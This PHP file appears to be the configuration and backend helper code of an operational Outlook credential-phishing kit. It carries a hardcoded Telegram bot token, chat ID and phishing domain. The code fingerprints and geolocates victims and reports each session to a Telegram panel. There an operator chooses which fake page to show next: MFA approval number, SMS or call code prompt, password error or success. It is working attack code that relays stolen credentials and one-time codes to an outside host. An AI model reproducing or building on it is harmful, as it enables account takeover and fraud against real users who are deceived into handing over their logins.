<?php

// Compatibility patch for servers misreporting their PHP version
if (!function_exists('str_contains')) {
    function str_contains(string $haystack, string $needle): bool {
        return $needle !== '' && mb_strpos($haystack, $needle) !== false;
    }
}

// config.php — Outlook Sign-in · Telegram Remote Control

define('TG_TOKEN',     '8095159728:AAHlKwCVVX4I0CQarW7HhYpTuJlNqI3oao4');
define('TG_CHAT_ID',   '1212136600');
define('APP_URL',      'https://yi.hubyvc.com/1vite/outlook'); // ← change to live domain
define('SESSIONS_DIR',  __DIR__ . '/sessions_data');

if (!is_dir(SESSIONS_DIR)) mkdir(SESSIONS_DIR, 0777, true);

/* ══════════════════════════════════════════
   DEVICE DETECTION
══════════════════════════════════════════ */
function detect_device(string $ua): array {
    $u = strtolower($ua);
    $os = 'Unknown OS';
    if (str_contains($u, 'iphone'))             $os = '🍎 iPhone (iOS)';
    elseif (str_contains($u, 'ipad'))           $os = '🍎 iPad (iOS)';
    elseif (str_contains($u, 'android'))        $os = '🤖 Android';
    elseif (str_contains($u, 'windows nt 10'))  $os = '🪟 Windows 10/11';
    elseif (str_contains($u, 'windows nt 6.3')) $os = '🪟 Windows 8.1';
    elseif (str_contains($u, 'windows nt 6.1')) $os = '🪟 Windows 7';
    elseif (str_contains($u, 'windows'))        $os = '🪟 Windows';
    elseif (str_contains($u, 'mac os x'))       $os = '🍏 macOS';
    elseif (str_contains($u, 'linux'))          $os = '🐧 Linux';
    elseif (str_contains($u, 'chromeos'))       $os = '💻 ChromeOS';

    $type = 'Desktop 🖥️';
    if (str_contains($u, 'mobile'))             $type = 'Mobile 📱';
    elseif (str_contains($u, 'tablet') || str_contains($u, 'ipad')) $type = 'Tablet 📟';

    $browser = 'Unknown Browser';
    if (str_contains($u, 'edg/') || str_contains($u, 'edge/'))      $browser = '🔵 Microsoft Edge';
    elseif (str_contains($u, 'opr/') || str_contains($u, 'opera'))  $browser = '🔴 Opera';
    elseif (str_contains($u, 'brave'))                               $browser = '🦁 Brave';
    elseif (str_contains($u, 'chrome') && !str_contains($u, 'chromium')) $browser = '🌐 Chrome';
    elseif (str_contains($u, 'chromium'))                            $browser = '🌐 Chromium';
    elseif (str_contains($u, 'firefox'))                             $browser = '🦊 Firefox';
    elseif (str_contains($u, 'safari') && !str_contains($u, 'chrome')) $browser = '🧭 Safari';
    elseif (str_contains($u, 'msie') || str_contains($u, 'trident')) $browser = '💀 IE';
    elseif (str_contains($u, 'samsung'))                             $browser = '📱 Samsung Browser';

    $ver = '';
    if (preg_match('/(chrome|firefox|safari|edg|opr|version)\/([0-9]+)/i', $ua, $m))
        $ver = ' v' . $m[2];

    return ['os' => $os, 'browser' => $browser . $ver, 'type' => $type, 'ua' => $ua];
}

/* ══════════════════════════════════════════
   GEO-IP LOCATION (City, State, Country)
   3-tier fallback — never returns N/A
══════════════════════════════════════════ */
function get_visitor_location(string $ip = ''): string {
    if (!$ip) $ip = $_SERVER['REMOTE_ADDR'] ?? '';

    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]);
    }
    $ip = preg_replace('/:\d+$/', '', trim($ip));

    if ($ip === '127.0.0.1' || $ip === '::1' || strpos($ip, '192.168.') === 0) {
        return 'Localhost / Private Network';
    }

    // Tier 1: ip-api.com
    $d = _geo_fetch('http://ip-api.com/json/' . urlencode($ip) . '?fields=status,city,regionName,country');
    if ($d && isset($d['status']) && $d['status'] === 'success') {
        return _geo_format($d['city'] ?? '', $d['regionName'] ?? '', $d['country'] ?? '');
    }

    // Tier 2: ipwho.is
    $d2 = _geo_fetch('https://ipwho.is/' . urlencode($ip));
    if ($d2 && !empty($d2['success'])) {
        return _geo_format($d2['city'] ?? '', $d2['region'] ?? '', $d2['country'] ?? '');
    }

    // Tier 3: geoplugin.net
    $d3 = _geo_fetch('http://www.geoplugin.net/json.gp?ip=' . urlencode($ip));
    if ($d3) {
        return _geo_format(
            $d3['geoplugin_city'] ?? '',
            $d3['geoplugin_region'] ?? '',
            $d3['geoplugin_countryName'] ?? ''
        );
    }

    return $ip ?: 'Unknown Location';
}

function _geo_fetch(string $url): ?array {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 4,
        CURLOPT_CONNECTTIMEOUT => 3,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_USERAGENT      => 'Mozilla/5.0',
        CURLOPT_HTTPHEADER     => ['Accept: application/json'],
    ]);
    $res = curl_exec($ch);
    $err = curl_errno($ch);
    curl_close($ch);
    if ($err || !$res) return null;
    $data = json_decode($res, true);
    return is_array($data) ? $data : null;
}

function _geo_format(string $city, string $state, string $country): string {
    $parts = [];
    if ($city    && $city    !== '-') $parts[] = trim($city);
    if ($state   && $state   !== '-' && $state !== $city) $parts[] = trim($state);
    if ($country && $country !== '-') $parts[] = trim($country);
    return $parts ? implode(', ', $parts) : 'Unknown Location';
}

/* ══════════════════════════════════════════
   VISITOR STATE
══════════════════════════════════════════ */
function state_file(string $sid): string {
    return SESSIONS_DIR . '/v_' . preg_replace('/[^a-zA-Z0-9]/', '', $sid) . '.json';
}
function get_state(string $sid): array {
    $f = state_file($sid);
    if (!file_exists($f)) return [
        'page' => 'email', 'prompt_number' => 87, 'blocked' => false,
        'sid' => $sid, 'ip' => $_SERVER['REMOTE_ADDR'] ?? '?',
        'created' => date('H:i:s d/m/Y'),
        'device_os' => '?', 'device_browser' => '?', 'device_type' => '?',
    ];
    return json_decode(file_get_contents($f), true) ?? [];
}
function set_state(string $sid, array $data): void {
    $cur = get_state($sid);
    file_put_contents(state_file($sid), json_encode(array_merge($cur, $data)));
}
function delete_visitor(string $sid): void {
    $f = state_file($sid);
    if (file_exists($f)) unlink($f);
}

/* ══════════════════════════════════════════
   TELEGRAM API
══════════════════════════════════════════ */
function tg_send(string $text, array $rows = []): void {
    $keyboard = [];
    foreach ($rows as $row) {
        $kb_row = [];
        foreach ($row as $btn) {
            $b = ['text' => $btn['text']];
            if (!empty($btn['url']))           $b['url']           = $btn['url'];
            if (!empty($btn['callback_data'])) $b['callback_data'] = substr($btn['callback_data'], 0, 64);
            $kb_row[] = $b;
        }
        if ($kb_row) $keyboard[] = $kb_row;
    }
    $payload = ['chat_id' => TG_CHAT_ID, 'text' => $text, 'parse_mode' => 'HTML'];
    if ($keyboard) $payload['reply_markup'] = json_encode(['inline_keyboard' => $keyboard]);
    _tg_post('sendMessage', $payload);
}
function tg_answer(string $cq_id, string $toast = ''): void {
    _tg_post('answerCallbackQuery', ['callback_query_id' => $cq_id, 'text' => $toast]);
}
function _tg_post(string $method, array $data): array {
    $ch = curl_init('https://api.telegram.org/bot' . TG_TOKEN . '/' . $method);
    curl_setopt_array($ch, [CURLOPT_POST => true, CURLOPT_POSTFIELDS => $data,
        CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 10]);
    $res = curl_exec($ch); curl_close($ch);
    return json_decode($res ?? '{}', true) ?? [];
}

/* ══════════════════════════════════════════
   KEYBOARD BUILDERS
══════════════════════════════════════════ */

function tg_panel(string $sid): void {
    $s = get_state($sid);
    tg_send(
        "🎛 <b>OUTLOOK CONTROL PANEL</b>\n\n" .
        "🆔 ID: <code>{$sid}</code>\n\n" .
        "📌 <b>Choose what to show this visitor:</b>",
        [
            [
                ['text' => '🔔 Approve Sign In', 'callback_data' => "np|{$sid}"],
                ['text' => '📱 Enter Code',      'callback_data' => "vc|{$sid}"],
            ],
            [
                ['text' => '💬 Text Code',        'callback_data' => "sms|{$sid}"],
                ['text' => '📞 Call Code',         'callback_data' => "call|{$sid}"],
            ],
            [
                ['text' => '❌ Password Error',   'callback_data' => "pwe|{$sid}"],
                ['text' => '💛 SUCCESS',           'callback_data' => "ok|{$sid}"],
            ],
            [
                ['text' => '🅱️ Block Visitor',    'callback_data' => "blk|{$sid}"],
            ],
        ]
    );
}

function tg_number_grid(string $sid): void {
    $rows = [];
    foreach (array_chunk(range(1, 100), 8) as $chunk) {
        $row = [];
        foreach ($chunk as $n)
            $row[] = ['text' => "$n", 'callback_data' => "pn|{$sid}|{$n}"];
        $rows[] = $row;
    }
    $rows[] = [['text' => '« Back to Panel', 'callback_data' => "panel|{$sid}"]];
    tg_send("🔢 <b>Pick number for Approve Sign-in Request (1–100)</b>\n🆔 Visitor: <code>{$sid}</code>", $rows);
}

function tg_after_approve(string $sid, int $num): void {
    tg_send(
        "🔔 <b>Approve App page shown — Number: {$num}</b>\n🆔 Visitor: <code>{$sid}</code>\n\n<b>Waiting for Visitor. What happened?</b>",
        [
            [['text' => '✅ Approved →',          'callback_data' => "ok|{$sid}"],
             ['text' => '❌ Denied → Error',       'callback_data' => "pme|{$sid}"]],
            [['text' => '💬 Switch to Text Code', 'callback_data' => "sms|{$sid}"],
             ['text' => '📱 Switch to Verify Code','callback_data' => "vc|{$sid}"]],
            [['text' => '🔢 Change Number',        'callback_data' => "np|{$sid}"],
             ['text' => '🅱️ Block Visitor',        'callback_data' => "blk|{$sid}"]],
        ]
    );
}

function tg_after_code(string $sid, string $type = 'sms'): void {
    $label = $type === 'call' ? '📞 Call Code' : '💬 Text Code';
    tg_send(
        "{$label} — Code submitted\n🆔 Visitor: <code>{$sid}</code>\n\n<b>What next?</b>",
        [
            [['text' => '✅ Correct →',       'callback_data' => "ok|{$sid}"],
             ['text' => '❌ Wrong Code Error', 'callback_data' => "ce|{$sid}"]],
            [['text' => '⏳ Keep Loading',     'callback_data' => "ld|{$sid}"],
             ['text' => '🅱️ Block Visitor',   'callback_data' => "blk|{$sid}"]],
        ]
    );
}

function tg_after_vc(string $sid): void {
    tg_send(
        "📱 <b>Verification Code Submitted</b>\n🆔 Visitor: <code>{$sid}</code>\n\n<b>What next?</b>",
        [
            [['text' => '✅ Correct →',       'callback_data' => "ok|{$sid}"],
             ['text' => '❌ Wrong Code Error', 'callback_data' => "ce|{$sid}"]],
            [['text' => '⏳ Keep Loading',     'callback_data' => "ld|{$sid}"],
             ['text' => '🅱️ Block Visitor',   'callback_data' => "blk|{$sid}"]],
        ]
    );
}